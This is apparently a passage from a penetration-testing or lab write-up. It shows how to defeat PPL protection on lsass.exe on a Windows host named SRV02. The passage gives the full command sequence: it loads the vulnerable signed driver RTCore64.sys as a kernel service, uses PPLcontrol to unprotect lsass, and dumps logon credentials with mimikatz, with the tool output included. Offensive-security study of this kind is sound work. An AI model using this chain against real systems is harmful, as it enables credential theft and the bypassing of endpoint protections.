### Dumping credentials on SRV02

![](Screenshot%202026-11-17%20at%2015.35.20.png)

We have administrative (SYSTEM) privileges on the machine. Why can't we still dump credentials? Let's check the source code snippet of mimikatz.

![](Advancing-20261117-153549.png)

For a computer with PPL enabled, such as Srv02, we will get that error if we try to dump credentials from lsass.exe. However, PPL can still be bypassed. Mimikatz driver `mimidrv.sys` can be used to remove the `PPL protection` of process `lsass.exe`. After that, attackers can dump the credentials.

However, nowadays, `mimidrv.sys` is also flagged by AV/EDR software. We can build our own driver and sign it. Sounds difficult? We can also leverage vulnerable signed drivers with vulnerabilities to execute arbitrary code, such as `RTCore64.sys` (signed by MICRO-STAR), `ProcExp152.sys` (signed by Microsoft), etc.

Some recent tools such as `EDRSandblast` ([https://github.com/wavestone-cdt/EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast)), `PPLControl` ([https://github.com/itm4n/PPLcontrol](https://github.com/itm4n/PPLcontrol)), and `RToolZ` ([https://github.com/OmriBaso/RToolZ](https://github.com/OmriBaso/RToolZ)) can abuse a vulnerable driver to remove PPL.

Let's download a vulnerable driver, `RTCore64.sys` from [https://github.com/RedCursorSecurityConsulting/PPLKiller/blob/master/driver/RTCore64.sys](https://github.com/RedCursorSecurityConsulting/PPLKiller/blob/master/driver/RTCore64.sys) and build PPLControl. Execute the following commands to load the driver:

```sh
*Evil-WinRM* PS C:\Users\svc_sql\Documents> sc.exe create RTCore64 type= kernel start= auto binPath= C:\Users\svc_sql\Documents\RTCore64.sys DisplayName= "control"
[SC] CreateService SUCCESS

*Evil-WinRM* PS C:\Users\svc_sql\Documents> net start RTCore64

The control service was started successfully.

*Evil-WinRM* PS C:\Users\svc_sql\Documents> .\PPLcontrol.exe list

   PID  |  Level  |     Signer      |     EXE sig. level    |     DLL sig. level    |    Kernel addr.
 -------+---------+-----------------+--------------------+----------+--
      4 | PP  (2) | WinSystem   (7) | WindowsTcb     (0x1e) | Windows        (0x1c) | 0xffff8d0cfa680080
     88 | PP  (2) | WinSystem   (7) | Unchecked      (0x00) | Unchecked      (0x00) | 0xffff8d0cfa68d080
    296 | PPL (1) | WinTcb      (6) | WindowsTcb     (0x3e) | Windows        (0x0c) | 0xffff8d0cfe9ac0c0
    400 | PPL (1) | WinTcb      (6) | WindowsTcb     (0x3e) | Windows        (0x0c) | 0xffff8d0cfa682080
    504 | PPL (1) | WinTcb      (6) | WindowsTcb     (0x3e) | Windows        (0x0c) | 0xffff8d0cfeb390c0
    512 | PPL (1) | WinTcb      (6) | WindowsTcb     (0x3e) | Windows        (0x0c) | 0xffff8d0cfeb11240
    640 | PPL (1) | WinTcb      (6) | WindowsTcb     (0x3e) | Windows        (0x0c) | 0xffff8d0cff7c3380
    656 | PPL (1) | Lsa         (4) | Windows        (0x3c) | Microsoft      (0x08) | 0xffff8d0cfec390c0
    352 | PPL (1) | Windows     (5) | Windows        (0x3c) | Windows        (0x0c) | 0xffff8d0cfebbd0c0
   3104 | PPL (1) | Antimalware (3) | Antimalware    (0x37) | Microsoft      (0x08) | 0xffff8d0d005fe080
   4092 | PP  (2) | Windows     (5) | Windows        (0x1c) | Windows        (0x1c) | 0xffff8d0d00b88080
   3244 | PPL (1) | Windows     (5) | Windows        (0x3c) | Windows        (0x0c) | 0xffff8d0d00bb5080
   5684 | PPL (1) | Windows     (5) | Windows        (0x3c) | Windows        (0x0c) | 0xffff8d0d009e0080

[+] Enumerated 13 protected processes.

*Evil-WinRM* PS C:\Users\svc_sql\Documents> .\PPLcontrol.exe unprotect 656
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:5985  ...  OK
[+] The process with PID 656 is no longer a PP(L).
```

Once we have unprotected the process related to `Lsa`, we can successfully dump credentials from `lsass.exe`:

```sh
*Evil-WinRM* PS C:\Users\svc_sql\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:5985  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.1.13:5985  ...  OK

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 135036 (00000000:00020f7c)
Session           : Service from 0
User Name         : SSISTELEMETRY150
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 11/29/2023 5:55:19 AM
SID               : S-1-5-80-2575449109-2369498003-86869817-2770163484-1998650617
<SNIP>
```
